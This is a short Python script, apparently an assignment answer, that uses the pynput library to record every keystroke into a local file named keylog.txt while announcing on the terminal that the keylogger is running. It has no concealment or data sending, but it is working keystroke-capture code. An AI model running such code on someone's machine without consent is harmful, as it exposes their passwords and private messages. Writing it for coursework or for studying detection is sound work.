import pynput.keyboard

# Task 2 requirement: Log keystrokes to a file 
log_file = "keylog.txt"

def process_key_press(key):
    with open(log_file, "a") as f:
        try:
            # Logs regular characters
            f.write(str(key.char))
        except AttributeError:
            # Logs special keys (Space, Enter, etc.)
            f.write(" [" + str(key) + "] ")

# This starts the listener
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

print("Keylogger is running... Press Ctrl+C in this terminal to stop.")
with keyboard_listener:
    keyboard_listener.join()